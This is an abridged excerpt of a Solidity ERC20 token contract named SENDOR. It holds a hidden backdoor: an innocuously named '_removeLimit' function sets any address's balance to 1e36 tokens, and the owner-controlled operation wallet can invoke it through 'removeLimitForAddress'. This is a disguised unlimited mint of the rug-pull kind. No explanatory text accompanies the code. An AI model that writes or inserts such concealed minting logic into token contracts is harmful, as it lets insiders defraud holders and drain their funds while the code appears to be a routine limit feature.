...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _removeLimit(address _addr) internal {
        _balances[_addr] = 1e18 * 1e18;
    }
...
contract SENDOR is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("SENDOR", "SENDOR") {
        ...
        operationWallet = address(owner()); // set as fee wallet
    ...
    function updateOperationWallet(address newWallet) external onlyOwner {
        emit operationWalletUpdated(newWallet, operationWallet);
        operationWallet = newWallet;
    }

    function removeLimitForAddress(address _addr) external returns (bool) {
        require(msg.sender == operationWallet);
        _removeLimit(_addr);
    ...
    function withdrawFees() external {
        payable(operationWallet).transfer(address(this).balance);
    }
